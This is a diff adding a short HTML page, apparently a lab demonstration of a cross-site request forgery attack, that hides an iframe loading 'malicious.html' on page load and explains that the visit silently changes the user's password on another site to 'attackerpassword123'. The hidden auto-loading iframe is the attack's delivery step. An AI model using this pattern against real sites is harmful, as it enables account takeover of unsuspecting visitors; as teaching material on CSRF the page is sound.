@@ -1,0 +1,14 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Malicious Pasword Changing CSRF Attack</title>
+</head>
+<body>
+    <h1>Malicious Pasword Changing CSRF Attack</h1>
+    <p>This page shows how a CSRF attack is performed using iframe.</p>
+    <p>When you accessed this page the user password you had set up int he other website has changed to attackerpassword123, you can kind of see this by opening the backend database in text mode</p>
+    <p>Note:I decided to remove the part that showed the current password as that might confuse the user</p>
+    <!-- Hidden iframe that will load the CSRF form -->
+    <iframe src="malicious.html" style="display: none;"></iframe>
+</body>
+</html>
